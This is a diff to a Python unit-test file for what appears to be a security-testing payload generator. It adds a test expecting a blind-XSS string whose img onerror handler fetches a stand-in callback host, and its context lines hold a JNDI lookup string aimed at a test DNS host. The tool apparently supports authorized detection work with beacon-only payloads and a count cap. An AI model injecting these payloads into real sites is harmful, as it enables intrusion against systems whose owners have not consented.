@@ -29,12 +29,24 @@ class GeneratorTests(unittest.TestCase):
                                token="t", callback="dns.example.test", custom=None)
         self.assertEqual(payload, "${jndi:dns://dns.example.test/ai-bot-poc-t-1}")
 
+    def test_blind_xss_preset_runs_only_a_callback_beacon(self):
+        payload = make_payload("blind-xss", n=2, target="https://example.test",
+                               token="test token", callback="callback.example.test",
+                               custom=None)
+        self.assertEqual(
+            payload,
+            '\"><img src=x onerror="this.onerror=null;fetch('
+            "'https://callback.example.test/ai-bot-poc/test%20token/2',"
+            "{mode:'no-cors'})\">",
+        )
+
     def test_static_web_interface_has_safety_cap_and_download(self):
         source = (Path(__file__).parent.parent / "index.html").read_text(encoding="utf-8")
         self.assertIn('id="count" type="number" min="1" max="1000"', source)
         self.assertNotIn('id="authorized"', source)
         self.assertIn('id="download"', source)
         self.assertIn("URL.createObjectURL", source)
+        self.assertIn("callback.required = needsCallback", source)
 
 
 if __name__ == "__main__":
